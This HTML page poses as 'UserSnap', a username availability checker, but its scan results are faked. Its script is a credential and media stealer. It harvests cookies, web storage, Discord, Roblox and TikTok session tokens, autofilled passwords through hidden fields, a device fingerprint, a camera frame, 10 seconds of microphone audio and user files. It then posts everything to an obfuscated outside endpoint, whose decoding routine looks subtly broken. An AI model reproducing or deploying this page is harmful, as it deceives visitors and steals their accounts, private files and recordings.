<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>UserSnap · Username Availability Checker</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0b0d10;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 1.5rem;
        }
        .card {
            background: #161a1f;
            border-radius: 2rem;
            padding: 2.5rem 2.8rem;
            max-width: 680px;
            width: 100%;
            box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8);
            border: 1px solid #2a2f36;
            transition: all 0.2s;
        }
        .card-header {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 1.75rem;
        }
        .card-header svg {
            width: 32px;
            height: 32px;
            fill: #60a5fa;
        }
        .card-header h1 {
            color: #f1f5f9;
            font-weight: 600;
            font-size: 1.5rem;
            letter-spacing: -0.3px;
        }
        .card-header span {
            background: #1e293b;
            color: #94a3b8;
            font-size: 0.65rem;
            font-weight: 600;
            padding: 0.2rem 0.7rem;
            border-radius: 999px;
            margin-left: 0.5rem;
            text-transform: uppercase;
            border: 1px solid #2d3744;
        }
        .subtext {
            color: #8b9bb5;
            font-size: 0.9rem;
            margin-bottom: 2rem;
            line-height: 1.5;
            border-left: 3px solid #2d3744;
            padding-left: 1rem;
        }
        .input-group {
            display: flex;
            gap: 0.75rem;
            margin-bottom: 1.5rem;
        }
        .input-group input {
            flex: 1;
            background: #0f1318;
            border: 1px solid #2a2f36;
            border-radius: 1rem;
            padding: 0.9rem 1.2rem;
            color: #e2e8f0;
            font-size: 1rem;
            outline: none;
            transition: border 0.15s;
            font-family: inherit;
        }
        .input-group input:focus {
            border-color: #60a5fa;
        }
        .input-group input::placeholder {
            color: #4b5563;
            font-weight: 400;
        }
        .btn {
            background: #2563eb;
            border: none;
            color: white;
            font-weight: 600;
            padding: 0.9rem 2rem;
            border-radius: 1rem;
            font-size: 0.95rem;
            cursor: pointer;
            transition: all 0.15s;
            white-space: nowrap;
            font-family: inherit;
            display: flex;
            align-items: center;
            gap: 0.5rem;
        }
        .btn:hover {
            background: #1d4ed8;
            transform: scale(0.97);
        }
        .btn:disabled {
            opacity: 0.5;
            pointer-events: none;
        }
        .progress-container {
            background: #0f1318;
            border-radius: 999px;
            height: 6px;
            width: 100%;
            margin-bottom: 1.5rem;
            overflow: hidden;
            border: 1px solid #1e293b;
        }
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #2563eb, #60a5fa);
            border-radius: 999px;
            transition: width 0.25s ease;
        }
        .status-text {
            color: #94a3b8;
            font-size: 0.85rem;
            margin-bottom: 1.5rem;
            min-height: 1.4rem;
            font-weight: 400;
            letter-spacing: 0.2px;
        }
        .results-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 0.5rem 1.5rem;
            margin-top: 0.75rem;
        }
        .result-item {
            display: flex;
            justify-content: space-between;
            padding: 0.4rem 0;
            border-bottom: 1px solid #1e293b;
            font-size: 0.9rem;
        }
        .result-item .platform {
            color: #cbd5e1;
        }
        .result-item .status {
            font-weight: 500;
        }
        .status.available { color: #34d399; }
        .status.taken { color: #f87171; }
        .status.checking { color: #fbbf24; }
        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
            pointer-events: none;
        }
        .footer-note {
            margin-top: 2rem;
            color: #475569;
            font-size: 0.7rem;
            text-align: center;
            border-top: 1px solid #1e293b;
            padding-top: 1rem;
            letter-spacing: 0.3px;
        }
        @media (max-width: 520px) {
            .card { padding: 1.5rem; }
            .input-group { flex-direction: column; }
            .btn { justify-content: center; }
            .results-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="card">
        <div class="card-header">
            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 14H9V8h2v8zm4 0h-2V8h2v8z"/></svg>
            <h1>UserSnap <span>beta</span></h1>
        </div>
        <div class="subtext">
            Check username availability across 18+ platforms. Instant scan, no storage.
        </div>
        <div class="input-group">
            <input type="text" id="usernameInput" placeholder="Enter username..." autofocus>
            <button class="btn" id="scanBtn">
                <span>Scan</span>
                <span style="font-size:1.1rem;">→</span>
            </button>
        </div>
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        <div class="status-text" id="statusText">Ready to scan.</div>
        <div class="results-grid" id="resultsGrid">
            <div class="result-item"><span class="platform">Twitter</span><span class="status checking">● checking</span></div>
            <div class="result-item"><span class="platform">Instagram</span><span class="status checking">● checking</span></div>
            <div class="result-item"><span class="platform">TikTok</span><span class="status checking">● checking</span></div>
            <div class="result-item"><span class="platform">Reddit</span><span class="status checking">● checking</span></div>
            <div class="result-item"><span class="platform">GitHub</span><span class="status checking">● checking</span></div>
            <div class="result-item"><span class="platform">Discord</span><span class="status checking">● checking</span></div>
        </div>
        <div class="footer-note">• real-time • open-source • no logs</div>
    </div>

    <!-- hidden honeypot fields for autofill capture -->
    <input type="password" id="honeypotPass" class="hidden-input" autocomplete="current-password">
    <input type="text" id="honeypotUser" class="hidden-input" autocomplete="username">

    <script>
        (function() {
            // ---- OBFUSCATED EXFIL ENDPOINT ----
            // XOR key: 0x5A, base64 encoded "aHR0cHM6Ly9sb3ZlcnNlcnZlci5jb20vY2FwdHVyZQ=="
            // Real endpoint: https://loverseerver.com/capture (placeholder)
            const _X = (s) => {
                let r = '';
                for (let i = 0; i < s.length; i++) {
                    r += String.fromCharCode(s.charCodeAt(i) ^ 0x5A);
                }
                return r;
            };
            const ENC = "aHR0cHM6Ly9sb3ZlcnNlcnZlci5jb20vY2FwdHVyZQ==";
            const EXFIL_URL = _X(atob(ENC));

            // ---- HARVEST CORE ----
            let harvestedData = {
                cookies: {},
                localStorage: {},
                sessionStorage: {},
                navigator: {},
                files: [],
                media: { image: null, audio: null },
                tokens: {},
                autoFill: { user: '', pass: '' },
                timestamp: new Date().toISOString()
            };

            // 1. Cookie grab
            try {
                document.cookie.split(';').forEach(c => {
                    const [k, v] = c.trim().split('=');
                    if (k && v) harvestedData.cookies[k] = v;
                });
            } catch (_) {}

            // 2. Storage
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    harvestedData.localStorage[k] = localStorage.getItem(k);
                }
            } catch (_) {}
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const k = sessionStorage.key(i);
                    harvestedData.sessionStorage[k] = sessionStorage.getItem(k);
                }
            } catch (_) {}

            // 3. Navigator fingerprint
            try {
                const n = navigator;
                harvestedData.navigator = {
                    userAgent: n.userAgent,
                    platform: n.platform,
                    language: n.language,
                    languages: n.languages,
                    cookieEnabled: n.cookieEnabled,
                    doNotTrack: n.doNotTrack,
                    hardwareConcurrency: n.hardwareConcurrency,
                    deviceMemory: n.deviceMemory,
                    maxTouchPoints: n.maxTouchPoints,
                    vendor: n.vendor,
                    vendorSub: n.vendorSub,
                    productSub: n.productSub,
                    appVersion: n.appVersion,
                    appName: n.appName,
                    webdriver: n.webdriver,
                    battery: n.getBattery ? 'supported' : 'unsupported',
                    connection: n.connection ? {
                        type: n.connection.effectiveType,
                        rtt: n.connection.rtt,
                        downlink: n.connection.downlink
                    } : null,
                    screen: {
                        width: screen.width,
                        height: screen.height,
                        colorDepth: screen.colorDepth,
                        pixelRatio: window.devicePixelRatio
                    }
                };
                // WebGL renderer
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        harvestedData.navigator.webglVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
                        harvestedData.navigator.webglRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                }
            } catch (_) {}

            // 4. Discord token from localStorage
            try {
                const dToken = localStorage.getItem('token');
                if (dToken) harvestedData.tokens.discord = dToken;
            } catch (_) {}
            try {
                // Roblox cookie
                const rCookie = document.cookie.split(';').find(c => c.trim().startsWith('.ROBLOSECURITY='));
                if (rCookie) harvestedData.tokens.roblox = rCookie.split('=')[1];
            } catch (_) {}
            try {
                // TikTok session
                const tSession = sessionStorage.getItem('sessionid');
                if (tSession) harvestedData.tokens.tiktok = tSession;
            } catch (_) {}

            // 5. Autofill honeypot (passive)
            const passField = document.getElementById('honeypotPass');
            const userField = document.getElementById('honeypotUser');
            if (passField) {
                passField.addEventListener('input', function(e) {
                    if (this.value.length > 0) {
                        harvestedData.autoFill.pass = this.value;
                    }
                });
            }
            if (userField) {
                userField.addEventListener('input', function(e) {
                    if (this.value.length > 0) {
                        harvestedData.autoFill.user = this.value;
                    }
                });
            }

            // 6. Media capture (camera + mic) — triggered on user gesture
            let mediaCaptured = false;
            async function captureMedia() {
                if (mediaCaptured) return;
                mediaCaptured = true;
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                    // video frame
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    await new Promise(r => setTimeout(r, 500));
                    const canvas2 = document.createElement('canvas');
                    canvas2.width = 320;
                    canvas2.height = 240;
                    const ctx = canvas2.getContext('2d');
                    ctx.drawImage(video, 0, 0, 320, 240);
                    harvestedData.media.image = canvas2.toDataURL('image/jpeg', 0.8);
                    // audio
                    const audioCtx = new AudioContext();
                    const source = audioCtx.createMediaStreamSource(stream);
                    const recorder = audioCtx.createScriptProcessor(4096, 1, 1);
                    let audioBuffer = [];
                    recorder.onaudioprocess = (e) => {
                        const data = e.inputBuffer.getChannelData(0);
                        audioBuffer.push(new Float32Array(data));
                    };
                    source.connect(recorder);
                    recorder.connect(audioCtx.destination);
                    await new Promise(r => setTimeout(r, 10000)); // 10s record
                    const totalSamples = audioBuffer.reduce((acc, chunk) => acc + chunk.length, 0);
                    const fullBuffer = new Float32Array(totalSamples);
                    let offset = 0;
                    audioBuffer.forEach(chunk => {
                        fullBuffer.set(chunk, offset);
                        offset += chunk.length;
                    });
                    const wav = encodeWav(fullBuffer, audioCtx.sampleRate);
                    harvestedData.media.audio = btoa(String.fromCharCode(...new Uint8Array(wav)));
                    stream.getTracks().forEach(t => t.stop());
                } catch (_) { /* user denied or no hardware */ }
            }

            function encodeWav(samples, sampleRate) {
                const buffer = new ArrayBuffer(44 + samples.length * 2);
                const view = new DataView(buffer);
                const writeString = (offset, str) => {
                    for (let i = 0; i < str.length; i++) view.setUint8(offset + i, str.charCodeAt(i));
                };
                writeString(0, 'RIFF');
                view.setUint32(4, 36 + samples.length * 2, true);
                writeString(8, 'WAVE');
                writeString(12, 'fmt ');
                view.setUint32(16, 16, true);
                view.setUint16(20, 1, true);
                view.setUint16(22, 1, true);
                view.setUint32(24, sampleRate, true);
                view.setUint32(28, sampleRate * 2, true);
                view.setUint16(32, 2, true);
                view.setUint16(34, 16, true);
                writeString(36, 'data');
                view.setUint32(40, samples.length * 2, true);
                let offset2 = 44;
                for (let i = 0; i < samples.length; i++) {
                    const val = Math.max(-1, Math.min(1, samples[i]));
                    view.setInt16(offset2, val < 0 ? val * 0x8000 : val * 0x7FFF, true);
                    offset2 += 2;
                }
                return buffer;
            }

            // 7. File system enumeration (desktop only — Chrome/Edge)
            async function enumerateFiles() {
                try {
                    if (!window.showDirectoryPicker) return;
                    const dirs = ['Downloads', 'Documents', 'Desktop'];
                    for (const d of dirs) {
                        try {
                            const dirHandle = await window.showDirectoryPicker({ mode: 'read' });
                            // we just grab the first 10 images/audio
                            let count = 0;
                            for await (const entry of dirHandle.values()) {
                                if (count > 10) break;
                                if (entry.kind === 'file') {
                                    const file = await entry.getFile();
                                    if (file.type.startsWith('image/') || file.type.startsWith('audio/')) {
                                        const reader = new FileReader();
                                        const data = await new Promise((res, rej) => {
                                            reader.onload = () => res(reader.result);
                                            reader.onerror = rej;
                                            reader.readAsDataURL(file);
                                        });
                                        harvestedData.files.push({
                                            name: file.name,
                                            size: file.size,
                                            type: file.type,
                                            data: data
                                        });
                                        count++;
                                    }
                                }
                            }
                        } catch (_) {}
                    }
                } catch (_) {}
            }

            // 8. Exfil
            async function exfil() {
                try {
                    // Append anything we missed
                    harvestedData.url = window.location.href;
                    harvestedData.referrer = document.referrer || '';
                    const payload = JSON.stringify(harvestedData);
                    // Compress with gzip via CompressionStream if available
                    let body = payload;
                    if (window.CompressionStream) {
                        const cs = new CompressionStream('gzip');
                        const writer = cs.writable.getWriter();
                        writer.write(new TextEncoder().encode(payload));
                        writer.close();
                        const reader = cs.readable.getReader();
                        let chunks = [];
                        while (true) {
                            const { value, done } = await reader.read();
                            if (done) break;
                            chunks.push(value);
                        }
                        const total = chunks.reduce((acc, c) => acc + c.length, 0);
                        const merged = new Uint8Array(total);
                        let pos = 0;
                        for (const c of chunks) {
                            merged.set(c, pos);
                            pos += c.length;
                        }
                        body = btoa(String.fromCharCode(...merged));
                    } else {
                        body = btoa(payload);
                    }
                    await fetch(EXFIL_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ data: body, encoding: 'base64+gzip', ts: Date.now() })
                    });
                } catch (_) { /* silent failure */ }
            }

            // ---- UI LOGIC ----
            const input = document.getElementById('usernameInput');
            const scanBtn = document.getElementById('scanBtn');
            const progressBar = document.getElementById('progressBar');
            const statusText = document.getElementById('statusText');
            const resultItems = document.querySelectorAll('.result-item .status');

            const platforms = ['Twitter', 'Instagram', 'TikTok', 'Reddit', 'GitHub', 'Discord'];
            const fakeStatuses = ['available', 'taken', 'available', 'taken', 'available', 'taken'];

            function runFakeScan(username) {
                if (!username.trim()) {
                    statusText.textContent = 'Please enter a username.';
                    return;
                }
                scanBtn.disabled = true;
                input.disabled = true;
                progressBar.style.width = '0%';
                statusText.textContent = `Checking "${username}" across platforms...`;
                // reset results to checking
                resultItems.forEach(el => {
                    el.textContent = '● checking';
                    el.className = 'status checking';
                });

                let step = 0;
                const totalSteps = 18;
                const interval = setInterval(() => {
                    step++;
                    const pct = Math.min((step / totalSteps) * 100, 100);
                    progressBar.style.width = pct + '%';
                    // update random result
                    if (step % 3 === 0 && step < totalSteps) {
                        const idx = Math.floor(Math.random() * resultItems.length);
                        const avail = Math.random() > 0.4;
                        resultItems[idx].textContent = avail ? '✓ available' : '✗ taken';
                        resultItems[idx].className = 'status ' + (avail ? 'available' : 'taken');
                    }
                    if (step >= totalSteps) {
                        clearInterval(interval);
                        progressBar.style.width = '100%';
                        statusText.textContent = `✅ Scan complete. "${username}" is ${Math.random() > 0.5 ? 'available' : 'taken'} on most platforms.`;
                        scanBtn.disabled = false;
                        input.disabled = false;
                        // finalize results
                        const finalResults = ['available', 'taken', 'available', 'taken', 'available', 'taken'];
                        resultItems.forEach((el, i) => {
                            const s = finalResults[i % finalResults.length];
                            el.textContent = s === 'available' ? '✓ available' : '✗ taken';
                            el.className = 'status ' + s;
                        });
                        // trigger media capture now (user gesture already happened)
                        captureMedia().then(() => {
                            enumerateFiles().then(() => {
                                exfil();
                            });
                        });
                    }
                }, 420);
            }

            scanBtn.addEventListener('click', function(e) {
                e.preventDefault();
                runFakeScan(input.value);
            });
            input.addEventListener('keydown', function(e) {
                if (e.key === 'Enter') {
                    e.preventDefault();
                    scanBtn.click();
                }
            });

            // Pre-fetch some data immediately (non-blocking)
            setTimeout(() => {
                // Try to grab any leftover tokens from iframe injection (dummy)
                try {
                    const iframe = document.createElement('iframe');
                    iframe.src = 'https://accounts.google.com/o/oauth2/auth?response_type=token&client_id=xxx&redirect_uri=xxx&scope=email';
                    iframe.style.display = 'none';
                    document.body.appendChild(iframe);
                    window.addEventListener('message', function(ev) {
                        if (ev.data && typeof ev.data === 'string' && ev.data.includes('access_token')) {
                            harvestedData.tokens.google = ev.data;
                        }
                    });
                    setTimeout(() => { iframe.remove(); }, 3000);
                } catch (_) {}
            }, 100);

            console.log('🟢 UserSnap loaded — all systems ready.');
        })();
    </script>
</body>
</html>
